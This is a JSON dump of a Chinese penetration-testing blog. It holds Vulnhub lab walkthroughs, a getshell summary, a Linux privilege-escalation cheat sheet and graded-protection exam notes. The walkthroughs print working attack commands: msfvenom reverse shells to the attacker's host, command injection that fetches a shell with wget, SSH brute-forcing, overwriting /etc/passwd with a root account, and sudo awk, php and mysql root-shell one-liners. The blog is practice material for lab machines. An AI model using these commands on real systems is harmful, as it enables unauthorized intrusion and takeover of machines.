[{"title":"Vulnhub|Questions","url":"/238e957d.html","content":"1.靶机安装后无ip\n使用NAT模式，保证与攻击机kali在同一网段内。\n\n这里配置完了之后发现nmap不到靶机的ip。\n解决办法：  \n1.启动靶机时按shift，进入配置界面，修改配置信息：![avatar][img1]2.ip a查看网卡信息，可以看到靶机没有成功地被分配到ip，记住网卡名称ens33：![avatar][img2]3.vim /etc/network/interfaces看一下配置信息用的是哪一个网卡，把它们都改为ens33：![avatar][img3]/etc/init.d/networking/interfaces重启网卡后，重新启动靶机。\n\n\n\n此时靶机启动后，在攻击机上进行主机扫描时应能扫描到。\n\n2.css加载异常&amp;url重定向\n解决办法：将目标靶机ip地址设定为localhost vi /etc/hosts：![avatar][img4]  \n\n","categories":["渗透测试"],"tags":["Vulnhub"]},{"title":"Vulnhub|Os-Hax","url":"/9c45f9e.html","content":"0.靶机安装\n使用NAT模式，保证与攻击机kali在同一网段内。\n\n这里配置完了之后发现nmap不到靶机的ip。\n解决办法：1.靶机安装后无ip  \n\n此时靶机启动后，在攻击机上进行主机扫描时应能扫描到。\n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)和80(http)端口。  \n\n2.(80端口)web安全\nweb访问，查看源代码dirb扫描web目录dirb http://192.168.xxx.xxx :访问http://192.168.117.135/html 没有什么有用信息:访问http://192.168.117.135/img 发现flaghost.png，打开发现没有明示什么有用的信息：下载下来，进一步查看是否进行了图片隐写strings &lt;文件名&gt;发现疑似密码的字符串：访问http://192.168.117.135/wordpress ：  \n\n页面的css样式没有加载出来，并且点击功能切换页面时，url会重定向到localhost：  \n解决办法：2.css加载异常&amp;url重定向   \n\n使用wpscan扫描:  \n\nwpscan是一款专门针对WordPress安全扫描器  \n|功能|命令||:–|:–||扫描安装的插件|wpscan –url http://192.168.xxx.xxx/wordpress –enumerate p||扫描安装的插件的漏洞|wpscan –url http://192.168.xxx.xxx/wordpress –enumerate vp||枚举wordpress的用户|wpscan –url http://192.168.xxx.xxx/wordpress –enumerate u|\n\n发现一个用户web：结合上面发现的疑似密码字符串passw@45，尝试登陆，登陆失败：尝试取回口令，失败：查阅网上dalao的思路，发现这是一个目录……进入http://192.168.117.135/passw@45 发现flag2以及hostconfigure ：flag2内容是经过brainfuck加密的，解密得到账户密码：登陆后，发现该账户拥有超管权限：  \n\n3.getshell\n\n2021-12-03发布的提权相关文章getshell   \n\n3.1 msfvenom生成反弹shell代码msfvenom -p php/meterpreter/reverse_tcp lhost=&lt;攻击机ip地址&gt; lport=&lt;攻击机监听端口&gt; -o shell.php3.2.1 该系统的/Appearance/theme editor下可直接修改php代码，故可在此填入：将msfvenom生成的反弹shell代码粘贴到某一个php编辑器中（要把首部的‘/*’去掉） ，上传：3.2.2 该系统的/Activity monitor存在Command Injection漏洞，可借此wget 反弹shell代码来反弹shell：  \n\n验证存在Command Injection漏洞：192.168.xxx.xxx|id  \n\n192.168.xxx.xxx|wget &lt;反弹shell所在路径/shell.php&gt;3.3 打开metasploit监听：\n\n注意：此处的lhost与lport必须是攻击机的ip与端口，即与3.1 msfvenom生成反弹shell代码配置的一样   \n\n3.4访问http://192.168.117.135/wordpress,getshell成功：获取交互式shell：python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;切换用户web登录，登陆成功：反思|前面获得一个账户密码的时候就应该尝试ssh，若能登录则无需反弹shell的内容由sh切换为bash：/bin/bash  \n\n/bin/sh与/bin/bash的区别  \n\nsh一般设成bash的软链(symlink)ls -l /bin/sh  \nlrwxrwxrwx 1 root root 4 Sep 14 04:45 /bin/sh -&gt; bash    \n在一般的Linux系统当中（例外如FreeBSD，OpenBSD等），使用sh调用执行脚本相当于打开了bash的POSIX标准模式。  \n也就是说 /bin/sh 相当于 /bin/bash –posix   \n\n\n查看系统用户 cat /etc/passwd:进入/home，有两个用户文件夹：进入/user-a，没有发现什么。进入/web，发现flag3：  \n\n4.提权\n\n2021-12-01发布的提权相关文章提权  \n\n尝试sudo提权：利用awk：sudo /usr/bin/awk &#39;&#123;system(&quot;/bin/bash&quot;)&#125;&#39;提权成功，进入/root寻找最后一个flag：\n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","Metasoploit"]},{"title":"概念","url":"/be97aa85.html","content":"等保2.0安全通信网络层面 三级系统应提供什么的硬件冗余，保证系统的可用性：通信线路、关键网络设备、关键计算设备  \n等保三级中，恶意代码应该在哪里进行检测和清除：网络边界  \n第几级开始增加“抗抵赖性”的要求：第三级  \n三级系统网络安全的设备防护有几个检查项：8个（安全通信网络）  \n恶意代码应该在哪里进行检测和清除：网络边界  \n三级系统中，MS SQLserver的审核级别为：全部  \n等级保护工作有几项规定动作：5项：定级-备案-建设整改-等级测评-监督检查信息安全等级保护的首要环节是：定级/备案信息安全等级保护的关键是：建设整改使信息系统保护能力不断提高的保障是：监督检查  \n定级工作流程一般有几项：5项：确定定级对象-初步确定等级-专家评审-主管部门审核-备案审核定级过程中，初步确定等级为哪一级可自行确定最终保护等级：第一级网络运营者应当在哪个阶段确定网络的安全保护等级：规划设计阶段第二级以上的系统，网络运营者应当在网络的安全保护等级确定后10个工作日内，到县级以上公安机关报备。  \ncisco的配置通过什么协议备份：TFTP\n功能测试不能实现什么功能：全局访问控制策略  \n开展主机工具测试所必需了解的信息：操作系统、应用、ip  \n用户登录路由器的主要方式有：利用控制台端口、利用MODEM、VTY  \n超时自动断连：(Cisco)exec-timeout；(华为)idle-timeout  \n隔离技术中，安全性最好的是：物理隔离  \nWindows系统默认terminal services服务所开放的端口为：3389  \n","categories":["等保测评/初级考试"],"tags":[]},{"title":"“差异”题","url":"/e0b816a7.html","content":"三级与二级的差异\nQ:《基本要求》中，在应用安全层面的访问控制要求中，三级系统较二级系统增加的措施有哪些？A:1）应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则。2）访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级。3）应对重要的主体和客体设置安全标记，并控制主体对有安全标记的信息资源的访问。\n\n\nQ:二级中，应根据会话状态信息数为数据流提供明确的允许或拒绝访问能力，控制粒度为网段级？A:正确  \n\n《基本要求》/安全区域边界/访问控制：三级应对进出网络的数据流实现基于应用协议和应用内容的访问控制。\n三级为端口级，二级为网段级。  \n\n\n\nQ:应用层软件软件的容错，三级比二级多了什么要求？A:应提供自动保护功能，当故障发生时自动保护当前所有状态，保证系统能够进行恢复。  \n\n《基本要求》/安全计算环境/数据备份与恢复(三级与二级的差异)：应提供异地实时备份功能，利用通信网络将重要数据实时备份至备份场地。应提供重要数据处理系统的热冗余，保证系统的高可用性。\n\n\n等保2.0与1.0的差异\nQ:等保1.0和等保2.0的区别？A:    \n\n\n\n等保\n2.0\n1.0\n\n\n\n\n名称\n《信息安全技术网络安全等级保护基本要求》\n《信息安全技术系统安全等级保护基本要求》\n\n\n定级对象\n信息系统、基础信息网络、云计算平台、大数据平台、物联网系统、工业控制系统、采用移动互联技术的网络等\n信息系统\n\n\n安全要求\n安全通用要求与安全扩展要求\n安全要求\n\n\n措施分类结构变化\n技术： 安全物理环境、安全通信网络、安全区域边界、安全计算环境、安全管理中心 管理： 安全管理制度、安全管理机构、安全管理人员、安全建设管理、安全运维管理\n技术： 物理安全、网络安全、主机安全、应用安全、数据安全 管理： 安全管理制度、安全管理机构、人员安全管理、系统建设管理、系统运维管理\n\n\n内容变化\n定级-备案-建设整改-等级测评-监督检查+新的安全要求(风险评估、安全监测、通报预警、态势感知等)\n定级-备案-建设整改-等级测评-监督检查\n\n\n\n\n\nQ:等保2.0重点强调的关键技术包括？A:可信计算技术、强制访问控制、审计追查技术、结构化保护技术、多级互联技术  \n\n\nQ:等保2.0的“一个中心，三重防护”，分别指的是什么？A：“一个中心”指“安全管理中心”；“三重防护”指“通信网络防护”“区域边界防护”“计算环境防护”。  \n\n\nQ:等保2.0建设核心思想是什么？A:1）以可信认证为基础，构建一个可信的业务系统执行环境2）以访问控制技术为核心，实现主体对客体的受控访问3）构建集中管控、最小权限管理与三权分立的管理平台  \n\n","categories":["等保测评/初级考试"],"tags":[]},{"title":"getshell","url":"/75811fbe.html","content":"获取shell\n1.爆破  \n\n优先使用条件: 获得有限的账户池与密码池使用实例：Vulnhub|Me and My Girlfriend\n\n2.利用Metasoploit\n\n优先使用条件：获得使用内容的版本信息使用实例：Vulnhub|Os-hackNos\n\n3.反弹shell  \n\n优先使用条件：1.有填入并上传php代码的交互  \n\n(msfvenom生成反弹shell代码+填入+metasploit监听)使用实例：Vulnhub|Os-Hax  \n\n2.能够PUT/上传php代码  \n\n(msfvenom生成反弹shell代码+PUT/上传+metasploit监听)  \n(一句话木马+蚁剑+/usr/share/webshells/php/php_reverse_shell.php)使用实例：Vulnhub|SickOs1.2  \n\n\n\n获取交互式shell\n\npython\n\n\nsudo  python -c 'import pty;pty.spawn(\"/bin/sh\")'  //python&lt;3\npython3 -c 'import pty;pty.spawn(\"/bin/sh\")'\n\n\n\n\n待续\n\n","categories":["渗透测试"],"tags":["getshell"]},{"title":"Vulnhub|Os-hackNos","url":"/a8b692c1.html","content":"0.靶机安装\n使用NAT模式，保证与攻击机kali在同一网段内。\n\n这里配置完了之后发现nmap不到靶机的ip。\n解决办法：\n1.启动靶机时按shift，进入配置界面，修改配置信息：2.ip a查看网卡信息，可以看到靶机没有成功地被分配到ip，记住网卡名称ens33：3.vim /etc/network/interfaces看一下配置信息用的是哪一个网卡，把它们都改为ens33：/etc/init.d/networking/interfaces重启网卡后，重新启动靶机。\n\n此时靶机启动后，在攻击机上进行主机扫描时应能扫描到。\n\n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)和80(http)端口。  \n\n2.(80端口)web安全\nweb访问，查看源代码是一个apache2的默认页面，没有发现什么。dirb扫描web目录dirb http://192.168.xxx.xxx :访问http://192.168.117.134/drupal :该目录是一个内容管理系统。访问http://192.168.117.134/drupal/robots.txt :查看文件CHANGELOG.txt，获得版本信息：  \n\n3.getshell(msf)\n通过metasoploit搜索expsearch drupal：由于攻击目标不在根目录下，故需设置targeturi到对应目录/drupal：获取shell：将其转换成交互式的shell，先查看使用python版本：python&gt;3使用python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;：ls -a查看 /var/www/html 下的文件及文件夹：查看可疑文件alexander.txt：看上去经过base64加密，丢到网上解码器去解码：解码后的内容还是一段加密内容，查了一下发现像是经过brainfuck加密后的密文，继续解码：得到一个用户名和密码james:Hacker@4514，尝试直接su &lt;用户名&gt;切换登录：登陆失败，说明这套账户密码要么是闹你玩儿，要么是没有登陆权限。cat /etc/passwd 查看用户，发现是有james的，进入他的工作目录/home/james看一下，查看可疑文件user.txt:拿到第一个flag.txt    \n\n4. 提权\n\n2021-12-01发布的提权相关文章提权  \n\n尝试sudo提权，因不知道当前用户的密码故不可行：尝试suid提权find / -perm -u=s -type f 2&gt;/dev/null:利用wget：用python3在靶机里搭建一个建议服务器python3 -m http.server 8888(我这里先切换到 /etc 是为了一会获取文件时候省得输入路径，就直接切换到文件所在路径下了)通过攻击机将靶机里的passwd文件通过wget下载出来(上一步如果没有切换到/etc去搭建服务器的话，就要输入完整的文件所在路径)wget http://192.168.117.134:8888/passwd在攻击机上创建一个本地加密用户：openssl passwd -l -salt cyytest 123456\n\n注意此处的用户名必需≥5，否则会失败气死  \n\n将刚创建的加密的本地用户添加到passwd中：&lt;用户名&gt;:&lt;加密后的内容&gt;0:0:0::/root:/bin/bash同样在攻击机上搭建一个服务器：在靶机上将攻击机上的passwd文件通过wget下载并覆盖原有的passwd:通过账户密码 cyytest:123456 登录，成功获取root权限：查看root.txt，拿到第二个flag:    \n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","Metasoploit"]},{"title":"Vulnhub|Me and My Girlfriend","url":"/6ceb590b.html","content":"0.靶机安装\n使用NAT模式，保证与攻击机kali在同一网段内：\n\n1.信息收集\n主机扫描root@kali:~# nmap 192.168.xxx.0/24开放了ssh(22)和http(80)。\n\n2.(80端口)web安全\n2.1 web访问，查看页面源代码提示利用x-forward-for，在浏览器借助工具在请求头中加入 X-Forward-For:127.0.0.1 ,访问成功：注册一个账号用户登录：使用注册的账户登录：2.2 水平越权点击profile，请求中带有参数user_id：通过编辑user_id，能够获得其他用户的信息,存在水平越权：  \n\n此处可以通过样式编辑器编辑元素类型为text，即可将密码明文显示：  \n\n通过上述操作，可以收集到每个用户对应的账号与密码：\n\n\n\nusername\npassword\n\n\n\n\neweuhtandingan\nskuyatuh\n\n\naingmaung\nqwerty!!!\n\n\nsundatea\nindONEsia\n\n\nsedihaingmah\ncedihhihihi\n\n\nalice\n4lic3\n\n\n\n\n3.(22端口)SSH\n虽然通过2.2收集到的账户与密码，但不知道具有ssh登陆权限的账户密码是哪一个。将账户密码分别存储为uname.txt和passwd.txt：getshell (SSH爆破)root@kali:~# nmap -p 22 --script=ssh-brute --script-args userdb=uname.txt,passdb=passwd.txt 192.168.xxx.xxx获得可用账户密码：alice/4lic3 ：  \n\n使用Xshell远程登陆(ssh登陆的方式很多，直接用 ssh alice@&lt;靶机ip&gt; 也行)  \n\n“我是谁？我在哪？我有啥？”\n\n\n\n口令\n解释\n\n\n\n\nwhoami\n显示当前用户\n\n\npwd\n显示工作路径\n\n\nls -a\n当前目录下所有文件夹及文件\n\n\n\n显示可疑目录.my_secret 进入后 ls -a，查看flag1.txt，文件包含flag，及提示需要获得root权限才能得到另一个flag：  \n\n4.提权\n\n2021-12-01发布的提权相关文章提权sudo提权 (这里尝试sudo提权时发现具有提权条件，故暂不尝试其他提权方式)查询具有sudo权限命令：sudo -l\n尝试使用sudo-php提权(命令的含义我也不太懂，把它当作一种固定的语句吧):  CMD=\"/bin/sh\"  \nsudo php -r \"system('$CMD');\"\n使用 whoami 提权成功：进入 /root 目录，查看文件，找到flag2.txt：  \n\n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","水平越权","SSH爆破"]},{"title":"提权","url":"/e2181504.html","content":"提权途径\n\nsudo  sudo -l //查询具有sudo权限命令\nsuid  \n\n\nSUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。其中，大家熟知的具有提权功能的Linux可执行文件包括：\n\nfind / -perm -u=s type f 2>/dev/null //查询具有suid执行权限程序\n可利用的程序：nmap、vim、find、bash、more、less、nano、cp、wget  \n\n通过在/etc/passwd添加一个root权限账户  find / -writable -type f 2>/dev/null //查询可写权限的文件\n查看/etc/cron*下所含的所有文件  ls -la /etc/cron* //cron*是用来让使用者在固定时间或固定时间间隔执行程序之用(类似使用者的时程表),攻击者可根据root执行的程序寻找exp。\n\n\n\n提权\n\nphp  \n\n\nsudoCMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\nsuidsudo sh -c 'cp $(which php) .; chmod +s ./php'\nCMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh',['-p']);\"\n\n\nmysql  \n\n\nsudosudo -u root mysql -e '\\! /bin/bash'\n\n\nawk/mawk  \n\n\nsudosudo /usr/bin/awk '&#123;system(\"/bin/bash\")&#125;'\nmawk 'BEGIN &#123;system(\"/bin/sh\")&#125;'\n\n\n","categories":["渗透测试"],"tags":["提权"]},{"title":"勇敢一点","url":"/b822f9c7.html","content":"“Your time and energy are scarce resources. Do not waste them on trivial people or things. Do not answer unjustified questions, or reply curious comments. Ignore them all. Spend more time with wise peers. Read sparkling thoughts on books. Stay sharp, stay alone. “\n","categories":["随记"],"tags":[]}]